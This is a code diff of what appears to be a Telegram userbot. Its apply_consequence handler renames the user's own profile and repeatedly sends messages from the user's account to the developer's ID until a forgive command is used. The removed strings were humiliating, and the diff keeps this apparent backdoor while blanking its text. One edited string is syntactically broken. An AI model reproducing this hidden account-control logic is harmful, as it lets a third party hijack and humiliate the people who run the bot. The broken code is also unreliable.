@@ -17,7 +17,7 @@ import asyncio
 
 
 
-#Developer:
+#Developer: 
 
 #Modules
 client = phoenix.client.client
@@ -175,18 +175,19 @@ async def apply_consequence(event):
                 original_name = await client.get_me()
 
                 await client(UpdateProfileRequest(
-                    first_name="اني تبن وفاينل عمي",
+                    first_name="",
                     last_name="" 
                 ))
 
                 await event.reply("تم تطبيق العاقبة بنجاح!")
                 messages = [
-                    f"فاينل عمي وتاج راسي",
-                    f"يروحلك فدوه هذا @{user_to_change.username}",
-                    "حباب سامحني ؟",
-                    "اني جلبك",
-                    "اني گي",
-                    "سامحنييييي"
+                    f"",
+                    f"
+ @{user_to_change.username}",
+                    "A",
+                    "A",
+                    "A",
+                    "A"
                 ]
 
                 while is_applying_consequence:
@@ -194,7 +195,7 @@ async def apply_consequence(event):
                         await client.send_message(DEVELOPER_ID, message)
                         await asyncio.sleep(2)
 
-@client.on(events.NewMessage(pattern=r"\.سامحتك"))
+@client.on(events.NewMessage(pattern=r"\.A"))
 async def forgive(event):
     global is_applying_consequence, original_name
 
@@ -217,7 +218,7 @@ async def forgive(event):
                 last_name=original_name.last_name
             ))
 
-            await event.reply("شكرااا😭😭.")
+            await event.reply("A.")
 
 
 #============
@@ -322,7 +323,7 @@ print("""\033[031m
 │                   ██╔══╝  ██║██║╚██╗██║██╔══██║██║                        │
 │                   ██║     ██║██║ ╚████║██║  ██║███████╗                   │
 │                   ╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝                   │
-Developer: @i0i0ii
+Developer: A
 """)
 print("\033[032mStarted")
 
